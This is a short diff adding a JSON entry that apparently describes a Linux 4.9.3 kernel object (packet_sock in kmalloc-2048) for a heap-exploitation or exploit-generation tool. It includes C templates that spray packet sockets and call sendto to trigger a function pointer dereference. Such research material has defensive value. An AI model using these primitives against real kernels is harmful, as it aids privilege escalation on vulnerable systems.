@@ -1,0 +1,14 @@
+{
+  "target": "packet_sock_xmit",
+  "version": "4.9.3",
+  "size": 2048,
+  "allocator": "kmalloc_2048",
+  "name": "packet_sock",
+  "define": "for (int i = 0; i < %d; i++) {\n    s[i] = syscall(__NR_socket, 0x11, 2, htobe16(0x0806));\n    if (s[i] == -1) {\n        fail(\"[-] socket(SOCK_DGRAM)\");\n    }\n}\n",
+  "deref": "char buffer[16];\nuint8 content[20] = {0};\nuint64 address = (uint64)&content;\n*(uint16*)(address + 0) = 0x11;\n*(uint16*)(address + 2) = 0x300;\n*(uint32*)(address + 4) = 1;\n*(uint16*)(address + 8) = 1;\n*(uint8*)(address + 0xb) = 6;\nfor (int i = 0; i < %d; i++) {\n\tsyscall(__NR_sendto, s[i], buffer, 16, 0, address, 0x14);\n}\n",
+  "dependence": [],
+  "num": 0,
+  "pre_object": 0,
+  "post_object": 0,
+  "_comment": "We can allocate multiple sockets to increase the success rate. When sento is invoked, it could trigger a function pointer dereference."
+}
